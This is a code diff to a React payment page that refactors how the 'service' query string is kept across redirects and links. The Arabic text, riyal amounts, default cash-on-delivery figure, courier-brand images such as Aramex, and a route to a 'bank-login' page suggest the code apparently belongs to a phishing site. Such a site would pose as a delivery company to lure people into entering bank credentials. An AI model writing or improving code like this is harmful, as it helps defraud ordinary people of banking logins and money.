@@ -39,14 +39,6 @@ const PaymentRecipient = () => {
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
   );
-  
-  useEffect(() => {
-    const method = sessionStorage.getItem('paymentMethod');
-    if (!method) {
-      const target = `/pay/${id}/track${initialSearch || (urlService ? `?service=${urlService}` : "")}`;
-      navigate(target, { replace: true });
-    }
-  }, [id, navigate, initialSearch, urlService]);
 
   if (isLoading) {
     return <FullScreenLoader label="جاري تحميل بيانات المستلم..." />;
@@ -72,13 +64,27 @@ const PaymentRecipient = () => {
   const shippingInfo = payload;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+  const persistedSearch = useMemo(() => {
+    const params = new URLSearchParams(initialSearch || "");
+    if (serviceKey) {
+      params.set('service', serviceKey);
+    }
+    const search = params.toString();
+    return search ? `?${search}` : "";
+  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
       sessionStorage.setItem('serviceKey', serviceKey);
     }
   }, [serviceKey]);
+
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    if (!method) {
+      navigate(`/pay/${id}/track${persistedSearch}`, { replace: true });
+    }
+  }, [id, navigate, persistedSearch]);
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -137,7 +143,7 @@ const PaymentRecipient = () => {
         service: serviceName,
         service_key: serviceKey,
         amount: formattedAmount,
-        payment_url: `${window.location.origin}/pay/${id}/details${serviceQuery}`
+        payment_url: `${window.location.origin}/pay/${id}/details${persistedSearch}`
       },
       timestamp: new Date().toISOString()
     });
@@ -163,13 +169,13 @@ const PaymentRecipient = () => {
       const bank = sessionStorage.getItem('selectedBank');
       if (!bank || bank === 'skipped') {
         sessionStorage.removeItem('selectedBank');
-        navigate(`/pay/${id}/track${serviceQuery}`);
+        navigate(`/pay/${id}/track${persistedSearch}`);
         return;
       }
-      navigate(`/pay/${id}/bank-login${serviceQuery}`);
+      navigate(`/pay/${id}/bank-login${persistedSearch}`);
     } else {
       sessionStorage.setItem('selectedBank', 'skipped');
-      navigate(`/pay/${id}/details${serviceQuery}`);
+      navigate(`/pay/${id}/details${persistedSearch}`);
     }
   };
   
